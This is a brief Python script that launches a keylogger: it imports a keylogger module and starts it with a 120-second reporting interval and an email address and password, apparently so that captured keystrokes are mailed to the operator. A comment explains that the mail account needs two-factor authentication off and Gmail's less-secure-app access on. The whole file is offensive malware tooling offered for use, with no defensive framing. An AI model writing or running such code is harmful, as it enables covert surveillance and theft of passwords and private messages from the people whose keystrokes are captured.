#!/usr/bin/env python
import keylogger
'''
Must have 2FA turned off with email account
If Gmail must have allow access to less secure apps enabled
'''
my_keylogger = keylogger.Keylogger(120, email, password)
my_keylogger.start()